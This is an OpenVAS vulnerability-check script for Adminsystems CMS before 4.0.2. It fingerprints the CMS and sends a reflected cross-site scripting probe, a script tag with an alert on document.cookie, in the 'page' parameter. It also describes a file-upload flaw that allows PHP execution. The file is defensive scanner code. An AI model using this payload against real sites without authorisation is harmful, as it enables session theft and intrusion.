###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_adminsystems_cms_mult_vuln.nasl 11975 2018-10-19 06:54:12Z cfischer $
#
# Adminsystems CMS Multiple Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805292");
  script_version("$Revision: 11975 $");
  script_cve_id("CVE-2015-1603", "CVE-2015-1604");
  script_bugtraq_id(72605);
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 08:54:12 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-02-27 11:02:30 +0530 (Fri, 27 Feb 2015)");
  script_name("Adminsystems CMS Multiple Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with Adminsystems CMS
  and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Multiple errors exists as,

  - The upload action in the files.php script does not properly verify or
    sanitize user-uploaded files via the 'path' parameter.

  - The index.php script does not validate input to the 'page' parameter
    before returning it to users.

  - The /asys/site/system.php script does not validate input to the 'id'
    parameter before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary PHP code and execute arbitrary script code in
  a user's browser session within the trust relationship between their browser
  and the server.");

  script_tag(name:"affected", value:"Adminsystems CMS before 4.0.2");

  script_tag(name:"solution", value:"Upgrade to Adminsystems CMS version 4.0.2
  or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130394");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Feb/50");
# 2016-06-21: 404
#  script_xref(name:"URL", value:"http://sroesemann.blogspot.de/2015/02/report-for-advisory-sroeadv-2015-14.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_xref(name:"URL", value:"https://github.com/kneecht/adminsystems");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

if(!can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/adminsystems", "/cms", "/adminsystemscms", cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"), port:http_port);

  if(rcvRes && rcvRes =~ ">Powered by.*>Adminsystems<")
  {
    url = dir + '/index.php?page="><script>alert(document.cookie)</script>&lang';

    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"><script>alert\(document\.cookie\)</script>",
       extra_check:">Adminsystems<"))
    {
      report = report_vuln_url( port:http_port, url:url );
      security_message(port:http_port, data:report);
      exit(0);
    }
  }
}

exit(99);
